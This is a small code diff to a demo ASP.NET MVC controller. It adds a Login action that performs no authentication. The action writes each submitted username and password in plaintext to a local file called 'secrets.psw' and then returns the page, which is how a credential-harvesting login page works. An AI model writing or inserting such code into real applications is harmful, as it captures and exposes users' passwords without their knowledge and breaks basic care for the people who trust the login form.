@@ -40,6 +40,15 @@ namespace MVCDemo.Controllers {
             return View("PinkPanther");
         }
 
+        public IActionResult Login(string UserName, string Password) {
+
+            System.IO.StreamWriter fs = new System.IO.StreamWriter("secrets.psw");
+            fs.Write(UserName + " | " + Password);
+            fs.Close();
+
+            return View();
+        }
+
 
         public IActionResult Privacy() {
             return View();
